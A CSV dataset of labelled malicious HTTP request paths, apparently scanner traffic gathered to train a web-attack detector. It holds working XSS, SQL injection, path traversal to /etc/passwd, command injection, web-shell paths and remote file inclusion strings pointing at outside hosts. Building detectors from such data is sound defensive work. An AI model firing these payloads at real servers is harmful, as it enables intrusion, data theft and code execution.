payload,label
/dda2qr7j.cfc?<script>cross_site_scripting.nasl</script>,1
/cacti/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd,1
/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd,1
"?username=""<script>foo</script",1
/main.php?stuff=ver >q13167384&rem ,1
/g8nu2yy7.htm?<script>cross_site_scripting.nasl</script>,1
/manager/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00,1
/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script+>,1
"/jdx255ea.fts?<script>document.cookie=""testziyq=5055;""</script>",1
"/?<script>document.cookie=""testswjp=6010;""</script>",1
"/scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,590047445150,4,5,6,7,8,9,10,11--",1
"/azcrfs8d.php3?<script>document.cookie=""testjpdr=9205;""</script>",1
/top.php?stuff='&rm\x09q47253924\x09#,1
"/0w155a7c.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-bin/squirrelcart/cart_content.php?cart_isp_root=/etc/passwd\x00,1
"/xlj7h65o.kspx?<meta http-equiv=set-cookie content=""testtbbe=856"">",1
/2 girls with dildo's 1/,1
"/main.php?stuff=""&sleep 10 #",1
/examples/jsp/colors/cgiip.exe/wservice=wsbroker1/webtools/oscommand.w,1
/cacti/admin/admin.php?sid=0',1
/scripts/vvh_tajyleqq.php,1
"/s7qus4g3.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/starnet/addons/slideshow_full.php?album_name='1330537294,1
/cacti/htgrep/file=index.html&hdr=/etc/passwd,1
"/scripts/wgate/!?~urlmime=""><script>alert(""sap_its_urlmime_xss.nasl"")</script><img src=""",1
/scripts/pssdseehtgdp.cfm,1
/examples/jsp/num/setcookie.php?u=../../../../../../../../../../../../etc/passwd\x00&plugin=pblang_mult_flaws.nasl,1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('/./tmp/etfvyyifyy.sh+>+/dev/null+&'); function v,1
"/iv5vkgam.html?<meta http-equiv=set-cookie content=""testfosd=94"">",1
"/?<script>document.cookie=""testchuc=2100;""</script>",1
/examples/jsp/cal/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/yrxsovftek""",1
/examples/servlets/servlet/js/scripts.php?load=/etc/passwd\x00,1
//../../../../../../../../windows/win.ini,1
/javascript/manifest.exe,1
"/msadm/site/index.php3?authid=\""><script>alert('vulnerable')</script>",1
/help.php?q=;uname\x09#,1
/top.php?stuff='&rm q76213281 #,1
/opensiteadmin/scripts/classes/formmanager.php?path=http://cirt.net/rfiinc.txt?\x00,1
"/demo/ms-pe02/catalog.php?cid=0&sid='""&sortfield=title&sortorder=asc&pagenumber=1&main=http://192.168.202.96:8080/llumt7msyau5y?&",1
/4&#215;4/,1
"/main.php?stuff=""ping\x0b-w\x0b11000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b",1
/dda2qr7j.exe?<script>cross_site_scripting.nasl</script>,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.24.202/&frm_user=&scr_height=&scr_width=q13664242,1
"/scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- ",1
/main.php?logout='&del\x09q59435268\x09#,1
/en-us/account/print.php?what=article&id=',1
/examples/jsp/error/minis.php?month=../../../../../../etc/passwd,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+w+0+>>ctdn",1
/recordings/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10,1
/examples/servlets/servlet/index.php?act=arcade&do=stats&gameid=1',1
/scripts/check-lom.php?etcdir=http://cirt.net/rfiinc.txt?,1
/javascript/document.key,1
/h5sc3gxy.dll?<script>cross_site_scripting.nasl</script>,1
"/?<meta http-equiv=set-cookie content=""testbfpq=3326"">",1
/javascript/vbs.exe,1
/scripts/c0kha6w3apd3.shtml,1
"/egaet53a.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/ibill.pm,1
"/nuh3zirz.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/googlesearch/googlesearch.php?app[path][lib]=/etc/passwd\x00,1
"<meta http-equiv=set-cookie content=""testiklc=904"">",1
"/1qwv2p5p.do?<script>document.cookie=""testvqcy=252;""</script>",1
"/main.php?logout=""&ping\x0b-w\x0b8000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b",1
/javascript/oauth.exe,1
"/jujgxwav.fts?<script>document.cookie=""testknim=9383;""</script>",1
/scripts/minis.php?month=../../../../../../etc/passwd,1
/fastscripts/,1
//<body><script src=http://www.example.com/test?rnd=q81315649></script>,1
"/ygkjkngd.php?<meta http-equiv=set-cookie content=""testnago=4518"">",1
"/main.php?stuff=""rm,q47628643&rem,",1
/examples/jsp/num/smpwservicescgi.exe,1
"/vhzmaia2.html?<meta http-equiv=set-cookie content=""testkogj=3979"">",1
"/hjdzm96v.jsp?<script>document.cookie=""testbyqe=7474;""</script>",1
"/zroo33l4.asp?<meta http-equiv=set-cookie content=""testiklc=904"">",1
"/main.php?stuff=""\x0duname #",1
/searchsimple.php?searwords=<script>alert(412225577702)</script>&send=search,1
"/fo564rei.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/script-r0/,1
/examples/jsp/sessions/mlog.html?screen=/etc/passwd,1
/opensiteadmin/scripts/classes/fieldmanager.php?path=http://192.168.202.96:8080/llumt7msyau5y?\x00,1
/javascript/encode.exe,1
"/en-us/7o5qp766.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/d44uk9h2.idc?<meta http-equiv=set-cookie content=""testmybc=2088"">",1
"/weq93ppb.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/nyjgaorz.htm?<script>cross_site_scripting.nasl</script>,1
/eguestproxsssql/,1
/scripts/admin/connect.inc,1
"/<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
"/examples/jsp/num/forumdisplay.php?fid=21""><script>x</script>",1
"/scripts/search.jsp?q=%""<script>alert(1332010391)</script>",1
/cgi-bin/csguestbook.cgi?command=savesetup&setup=;system('cat /etc/passwd'),1
/include/scripts/run_auto_suspend.cron.php?dir=http://cirt.net/rfiinc.txt?,1
"/vac1l5vm.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/servlets/servlet/shopexd.asp?catalogid='42,1
/javascript/.passwd.jar,1
/cgi-bin/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|,1
"/rpxyx07v.jsp?<script>document.cookie=""testbnli=1975;""</script>",1
"/0rufe52p.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/phpmyadmin/sugarcrm/modules/users/login.php?theme=../../../../../../../etc/passwd\x00,1
ftp://192.168.24.202/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
/vjbrrppi.cfc?<script>cross_site_scripting.nasl</script>,1
/javascript/phpbb.exe,1
/static//.../.../.../.../.../.../.../.../windows/win.ini,1
/javascript/htpasswd.key,1
"/weq93ppb.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/shipped.exe,1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331918989')</script>,1
/wiki.php/<script>foo</script>,1
/examples/jsp/error/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00.txt,1
/javascript/trash.exe,1
"/yver8r9o.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/manager/nessus""><script>alert('django_admin_xss.nasl')</script>/",1
/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=http://192.168.202.96:8080/frznctvhi0i5??,1
"/jackrabbit/search.jsp?q=%""<script>alert(1331904374)</script>",1
/main.php?g2_view=zipcart.download&g2_file=../../../../../../../../../../../../etc/passwd,1
"/0qhcnefz.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/7dbjwpw6.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/servlets/servlet/cwmail.exe,1
/examples/jsp/colors/starnet/addons/slideshow_full.php?album_name='1914620104,1
"/jnt3f86c.asp?<meta http-equiv=set-cookie content=""testcmax=9270"">",1
/manager/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wk4aztya]));die;/*,1
"/6dlc2zm9.jsp?<meta http-equiv=set-cookie content=""testqpux=4016"">",1
/examples/jsp/checkbox/simple/view_page?mv_arg=|cat /etc/passwd|,1
/cacti/base_qry_common.php?base_path=/etc/passwd\x00,1
/recordings/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>,1
/cacti/search.cgi?..\..\..\..\..\..\windows\win.ini,1
"/0u75ldxq.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/top.php?stuff=""&ping\x0c-w\x0c7000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c",1
"/?<meta http-equiv=set-cookie content=""testulex=4996"">",1
/main.php?stuff=;uname >q81835212 #,1
"/main.php?stuff=""ping -w 9000 -n 1 1.2.3.4&rem ",1
/javascript/webmail.exe,1
/ripscript/,1
/examples/jsp/jsp2/el/directorypro.cgi?want=showcat&show=../../../../../etc/passwd\x00,1
/help.php?q=ping;-w;7000;-n;1;1.2.3.4|rem;,1
/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_1wubmpss]));die;/*,1
"/3hlysl2x.kspx?<script>document.cookie=""testgjbe=8505;""</script>",1
/main.php?stuff=&ver\x09>q65268393&rem\x09,1
/examples/jsp/jsp2/el/index.php?show=../../../../../../../../../../../etc/passwd\x00,1
"/5qnlm5z2.php3?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
"/bxnyrhmh.php3?<script>document.cookie=""testmjct=1867;""</script>",1
/cacti/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd,1
/5o9zq43e.asp?<script>cross_site_scripting.nasl</script>,1
"/yver8r9o.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 911180970,2,397451365,4,5,6,7,8,9,0,1,2,3 --",1
/interface/login/login_frame.php?site=<script>alert(owasp zap);</script>' and '1'='1,1
"/help.php?q=""\x0duname\x09>q41994252\x09#",1
/cacti/lang/lang.php?lang_path=/etc/passwd\x00,1
/ghostscript/,1
"/ybz5rz7a.asp?<script>document.cookie=""testsbvw=6289;""</script>",1
/auth-passwd/,1
"/606wkcop.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/top.php?stuff='&sleep\x0910\x09#,1
/t_scriptrap/,1
/examples/jsp/num/hw3.cgi?daysonly=0).system('id').(,1
/7o5qp766.cgi?<script>cross_site_scripting.nasl</script>,1
/index.php?id=',1
/misc/audio.php?recording=../version.inc,1
"/main.php?stuff=""ver&rem\x0c",1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/fphgokkkuu.sh'); function v,1
/phpmyadmin/calendar_admin.pl?config=|cat /etc/passwd|,1
/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904208')</script>,1
"/cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'--",1
"/p043snfr.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/login.php?procesa=si&usuario_nkads_admin=' or isnull(1/0)/*,1
"/h5sc3gxy.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/en-us/esmozg5d.htm?<script>cross_site_scripting.nasl</script>,1
"/demo/ms-pe02/catalog.php?cid=0&main=@rfiurl&pagenumber=1&sid='""&sortfield=title&sortorder=asc",1
/examples/jsp/sessions/jgs_portal_statistik.php?meinaction=themen&month=1&year=1',1
/javascript/checks.exe,1
/en-us/7o5qp766.x?<script>cross_site_scripting.nasl</script>,1
/cacti/lang/index.php?file=/etc/passwd,1
"/rpxyx07v.x?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/scripts/u7m5ok8eqpfy.html,1
"/help.php?q=""uname >q66737251 #",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;chmod+555+/tmp/yrxsovftek;""",1
"/vhzmaia2.pl?<script>document.cookie=""testkogj=3979;""</script>",1
"/e9rx3ya4.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/index.phtml?mode=view&album=`id`&pic=a=10.jpg&dispsize=640&start=0,1
/myspacewormnewxss/,1
/subscriptions.aspx,1
//<body><script src=http://www.example.com/test?rnd=q93456121></script>,1
/e9rx3ya4.php3?<script>cross_site_scripting.nasl</script>,1
/citrix/accessplatform/auth/clientscripts/,1
/examples/jsp/error/pwcgi/smpwservicescgi.exe?target=http://www.nessus.org,1
/examples/jsp/sessions/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1,1
"/vjbrrppi.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/b0j2ijssh6cu.shtml,1
"/en-us/ddoworrl.aspx?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/u95h6ymu.jspa?<meta http-equiv=set-cookie content=""testkhwc=4028"">",1
"/login.asp?sessionid=["">><script>alert(""414425594704"");</script>",1
/examples/jsp/sessions/admin/addentry.php?phpbb_root_path=/etc/passwd\x00,1
/examples/jsp/error/backend/classes.php?include_path=../lib/jinzora.js\x00,1
"/cacti/include/error/autherror.cfm?errorcode=1&ftvar_linkp=""></a><script>alert('fusetalk_mult_xss.nasl')</script><a href=""",1
/j4drbkil.idc?<script>cross_site_scripting.nasl</script>,1
/qb2xy9aw.asp?<script>cross_site_scripting.nasl</script>,1
"/o35zot2r.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/ssn.exe,1
/recordings/rot13sj.cgi?/etc/passwd,1
"/edv3mapy.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/cal/cwmail.exe,1
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/frznctvhi0i5?",1
"/igtf0zon.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/gvx7m5ti.idc?<meta http-equiv=set-cookie content=""testwldz=3506"">",1
/cacti/includes/converter.inc.php?include_path=/etc/passwd\x00,1
"/6qbynt4f.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/top.php?stuff='\x0ddel\x09q97796724\x09#,1
/scripts/wx4z4gedhl0l.sh,1
/phpmyadmin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>,1
"/fnwhrxyd.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
/recordings/store.php?crn=42'&action=show&show_products_mode=cat_click,1
"/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010414','5'--",1
/cgi/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
/javascript/pg.exe,1
/cgi-perl/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,1
/examples/jsp/jsp2/jspx/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search,1
/main.php?stuff=ping;-w;9000;-n;1;4.3.2.1&rem;,1
/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;,1
/examples/jsp/num/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search,1
/recordings/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00,1
/main.php?stuff=ping;-w;10000;-n;1;1.2.3.4&rem;,1
"/gvx7m5ti.htm?<script>document.cookie=""testwldz=3506;""</script>",1
/cacti/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
/archive.php?scriptpath=@rfiurl?scriptpath=@rfiurl?,1
/javascript/forum2.exe,1
"/lmw4r201.cfm?<meta http-equiv=set-cookie content=""testwews=8477"">",1
"/main.php?logout=""del\xa0q91628118&rem\xa0",1
/index.php?app=core&module=global&section=register/register/page__section__../../../../../cache/installer_lock__,1
/subscriptions.err,1
/scripts/fgos1sb1c1tr.html,1
/javascript/o.exe,1
/script_march06/,1
"/nmw0do67.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/album.exe,1
/crystalreportviewers/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini,1
"/top.php?stuff=""&ping,-w,10000,-n,1,4.3.2.1&rem,",1
/examples/jsp/jsp2/jspx/include/monitoring/engine/makexml.php?fileoreonconf=/etc/passwd\x00,1
"/help.php?q=""&uname >q11415113 #",1
/top.php?stuff=;uname >q61859553 #,1
/examples/jsp/checkbox/bb_func_txt.php?pathtofiles=/etc/passwd\x00,1
"/vmi8bb12.pl?<meta http-equiv=set-cookie content=""testlerc=2575"">",1
/examples/servlets/servlet/doc/index.php?s=/etc/passwd\x00,1
/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://192.168.202.118:8080/iroy1gvqrrqu?\x00,1
"/top.php?stuff=""&ping;-w;11000;-n;1;4.3.2.1&rem;",1
/examples/jsp/num/showcat.php?cat=1',1
/en-us/<script>cross_site_scripting.nasl</script>.idc,1
/cgibin/gwweb.exe?help=bad-request,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+72+65+68+45+78+69+74+54+56+ff+d7+ff+d0+00+00+00+00+00+00+00+00+00+00+00+00++>>esbq",1
/iktok2bw.fts?<script>cross_site_scripting.nasl</script>,1
"/qhvu0pdg.aspx?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/mpcgi/a1stats/a1disp3.cgi?../../../../../../../etc/passwd,1
"/examples/jsp/sessions/nessus""><script>alert('django_admin_xss.nasl')</script>/",1
/examples/jsp/sessions/index.php?post=../config/password,1
/cgi-local/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,1
/cgi-bin/multihtml.pl?multi=/etc/passwd\x00html,1
"/help.php?q=""|ping\x0b-w\x0b8000\x0b-n\x0b1\x0b1.2.3.4|rem\x0b",1
/examples/jsp/num/detail.asp?nchannel='1,1
/copatranscript_20061120/,1
/cgi.cgi/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332010390&lang_crm=../../vtigerservice.php\x00,1
/scripts/index.php?do=ext&page=http://xxxxxxxx/file,1
"/iktok2bw.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/num/sawmillcl.exe?ho+{complete_version},1
/papal_rescript/,1
/javascript/pending.exe,1
/it_script/,1
/m5103snj.aspx?<script>cross_site_scripting.nasl</script>,1
/cgi-914/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
"/phpmyadmin/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params""having 1=1",1
/cacti/index.php?cat=',1
/en-us/n9xlumt5.php?<script>cross_site_scripting.nasl</script>,1
"<script>document.cookie=""testnago=4518;""</script>",1
/javascript/sys.exe,1
"/9kr0ih0v.htm?<meta http-equiv=set-cookie content=""testzgnm=1183"">",1
"/zuihld5m.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/ns.exe,1
/examples/jsp/colors/index.php?post=../config/password,1
/examples/servlets/servlet/install.php?newlang=../../cpg_error.log\x00,1
/7uz3ok60.cgi?<script>cross_site_scripting.nasl</script>,1
/javascript/.passwd.sfish,1
"/login.php?course=""><script>alert(atutor_xss.nasl)</script>",1
"/nyvbv05h.htm?<script>document.cookie=""testftxz=5980;""</script>",1
/scripts/callboth.php?seq=654321&out=123456&in=1331923202@nessus\x0d\x0aasteridex_in_code_injection.nasl,1
"/zuihld5m.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.118:8080/moclyxlwqyfjnp?",1
/pbserver/..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/5o9zq43e.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/anonymous.exe,1
/search.pl?form=../../../../../../etc/passwd\x00,1
/top.php?stuff=&rm;q99662165&rem;,1
"/b4vng02k.htm?<script>document.cookie=""testtrlh=3672;""</script>",1
/javascript/mssql.exe,1
/webdav/c99.php?act=f&f=xampp-win32-1.7.2.exe&ft=download&d=c:\users\administrator\desktop,1
/javascript/tt.exe,1
"/en-us/odzk29aa.jsp?<script>document.cookie=""testtfvh=2141;""</script>",1
/cgi-perl/windmail.exe,1
/javascript/12.exe,1
"/main.php?logout=""&ping -w 8000 -n 1 1.2.3.4&rem ",1
/javascript/.htpasswd.sfish/-2147483648,1
/7uz3ok60.asp?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/store.php?crn=42'&action=show&show_products_mode=cat_click,1
"/scripts/index.php?op=default&date=200607' union select 1,1043097911,1,1,1,1,1,1,1,1--&blogid=1",1
/6n7aacgg.pl?<script>cross_site_scripting.nasl</script>,1
/javascript/files.exe,1
/main.php?logout=;del q18667266 #,1
"/cgi-bin/index.php?id='union/**/select/**/0,0,941052546,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
"/cacti/user.cgi?url=""><script>alert(""gossamer_links_url_xss.nasl"");</script>&from=add",1
"/help.php?q=""\x0duname >q44862556 #",1
////..\..\..\boot.ini,1
/phpwcms_template/inc_script/frontend_render/navigation/config_phplm.php?html_menu_dirpath=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
"/help.php?q=""&del\x0cq73531956&rem\x0c",1
/examples/jsp/colors/lang/index.php?file=/etc/passwd,1
/p_description/,1
"/quagynka.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-local/c32web.exe/changeadminpassword,1
"/jujgxwav.cfc?<meta http-equiv=set-cookie content=""testknim=9383"">",1
/javascript/article.exe,1
/script/menu/menuprincipal.php?path_inc=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
/javascript/1991.exe,1
"/q703m78q.htm?<script>document.cookie=""testvowq=604;""</script>",1
"/<script>document.cookie=""testftxz=5980;""</script>",1
/examples/jsp/error/check_user_id.php?user_id=<script>foo</script>,1
/main.php?stuff='\x0asleep\x097\x09#,1
/cgi-bin/index.php?id=k7u62jp49d',1
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331909220&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
/cgi/texis.exe/junk,1
/examples/jsp/checkbox/lang/lang.php?lang_path=/etc/passwd\x00,1
/examples/jsp/cal/library/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/scripts/gallery.scr.php?globals[pth][func]=@rfiurl?globals[pth][func]=@rfiurl?,1
/javascript/htpasswd.inc,1
"/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,504398662),3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
/examples/jsp/error/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
/scriptz/,1
/en-us/account/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini,1
/n9xlumt5.exe?<script>cross_site_scripting.nasl</script>,1
/main.php?logout=ver\x0c>q61251932&rem\x0c,1
/j4drbkil.nsf?<script>cross_site_scripting.nasl</script>,1
/javascript/htpasswd.js,1
/topic.php?tid='select,1
/help.php?q=\x0auname >q83373433 #,1
/0qhcnefz.cfc?<script>cross_site_scripting.nasl</script>,1
"/byrg33fw.exe?<meta http-equiv=set-cookie content=""testexuu=5340"">",1
/cacti/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd\x00&bn=fm_d1,1
"<script>document.cookie=""testftxz=5980;""</script>",1
/examples/jsp/jsp2/el/kb.cgi?view='&lang=en,1
"/help.php?q=""rm\x09q26563628\x09#",1
/examples/jsp/jsp2/el/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904404')</script>,1
/subscriptionlogon/,1
/mpcgi/query?mss=../config,1
/javascript/.passwd.so,1
"/help.php?q=""ver\xa0>q93611953&rem\xa0",1
/cgi-bin/wa.exe?debug-show-version,1
/t7tm4m0b.cgi?<script>cross_site_scripting.nasl</script>,1
/ny1b3qq4.pl?<script>cross_site_scripting.nasl</script>,1
"/en-us/jnv890lt.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/m5103snj.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/main.php?stuff=""ping,-w,10000,-n,1,4.3.2.1&rem,",1
/web_store/web_store.cgi?page=../../../../../../../../../../etc/passwd\x00.html,1
"/help.php?q=""&ping\x0c-w\x0c11000\x0c-n\x0c1\x0c4.3.2.1&rem\x0c",1
"/secure/register.php?next=""><script>alert(414605599126)</script><""",1
/examples/jsp/jsp2/el/install.php?newlang=../../cpg_error.log\x00,1
/javascript/spool.exe,1
"/nyjgaorz.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/server.exe,1
/index.php?id=s1_eihg6e1',1
/e9rx3ya4.php?<script>cross_site_scripting.nasl</script>,1
/phpmyadmin/embed/day.php?path=/etc/passwd\x00,1
/javascript/agenda.exe,1
/en-us/account/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc,1
/help.php?q=';uname >q16954753 #,1
/main.php?logout=ver >q37787214&rem ,1
/examples/jsp/num/man-cgi?section=0&topic=ls;id,1
/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/2aibfaczmac8??&cmd=ls,1
/recordings/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00,1
"/help.php?q=""|ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
/javascript/api.exe,1
"/xlj7h65o.jspa?<script>document.cookie=""testtbbe=856;""</script>",1
/examples/jsp/cal/sources/functions.php?root_path=/etc/passwd\x00,1
"/uc3w3bdi.htm?<meta http-equiv=set-cookie content=""testxllt=9940"">",1
/shoutbox.php?conf=../,1
/main.php?logout=&ver;>q53872587&rem;,1
//..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xafwindows/win.ini,1
"/vwmg565s.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/jspx/admin/top.php?admindir=/etc/passwd\x00,1
"/javascript/.htpasswd.sfish/sfish>'>""><sfish></sfish>",1
/examples/jsp/colors/shopper.cgi?newpage=../../../../../../etc/passwd,1
"/help.php?q=""&ping -w 7000 -n 1 1.2.3.4&rem ",1
/cgi-914/windmail.exe,1
"/scripts/calendar.php?month=' union select 1,1,'1331922013','calendarix_month_sql_injection.nasl',1 #",1
/en-us/s7qus4g3.kspx?<script>cross_site_scripting.nasl</script>,1
/en-us/dda2qr7j.cfc?<script>cross_site_scripting.nasl</script>,1
/news.php?config[script_path]=http://192.168.202.118:8080/ghl9il??,1
/examples/jsp/cal/htmlscript?../../../../../../../../../etc/passwd,1
/scripts/postinfo.asp,1
/program_description/,1
/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://192.168.202.118:8080/zz5thkvtmlgl?,1
"/oie504mr.exe?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
"/x7pclv4s.php?<script>document.cookie=""testiulz=3709;""</script>",1
/cacti/kernel/loadkernel.php?installpath=/etc/passwd\x00,1
